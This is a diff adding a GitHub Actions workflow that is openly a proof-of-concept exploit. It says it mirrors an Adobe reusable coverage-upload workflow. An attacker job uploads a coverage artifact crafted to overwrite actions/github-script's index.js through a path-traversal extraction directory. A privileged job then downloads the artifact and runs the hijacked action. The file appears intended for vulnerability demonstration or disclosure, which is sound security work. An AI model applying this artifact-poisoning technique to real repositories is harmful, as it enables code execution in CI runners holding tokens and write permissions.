@@ -1,0 +1,55 @@
+name: aio-coverage-artifact-rce-poc
+
+# Mirrors adobe/aio-reusable-workflows/.github/workflows/dependabot-coverage-upload.yml@main
+# as invoked by adobe/aio-lib-core-auth/.github/workflows/dependabot-coverage-upload.yml.
+# Only the untrusted inputs (artifact produced by the attacker's PR run) are simulated.
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  plant:
+    name: "attacker job: upload crafted coverage artifact"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+      - name: Install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted "coverage-report-ubuntu-latest-*" artifact
+        uses: ./.github/actions/plant
+        with:
+          name: coverage-report-ubuntu-latest-20.x
+          pairs: "poc-payload/rce.js->/home/runner/work/_actions/actions/github-script/v7/dist/index.js"
+          extract-dir: "../${{ github.event.repository.name }}/${{ github.event.repository.name }}/coverage-report-ubuntu-latest-20.x"
+
+  victim:
+    name: "privileged consumer job (shape of the reusable workflow)"
+    needs: plant
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      pull-requests: write
+    steps:
+      - uses: actions/checkout@v5
+      - name: Download coverage artifacts
+        uses: actions/download-artifact@v4
+        with:
+          pattern: coverage-report-ubuntu-latest-*
+          run-id: ${{ github.run_id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Inspect extracted tree
+        run: |
+          echo "== ls workspace =="; ls -la
+          echo "== target action file =="
+          ls -l /home/runner/work/_actions/actions/github-script/v7/dist/index.js || true
+          head -3 /home/runner/work/_actions/actions/github-script/v7/dist/index.js || true
+      - name: Innocent action step
+        uses: actions/github-script@v7
+        with:
+          script: |
+            console.log('LEGIT github-script ran (no overwrite)')
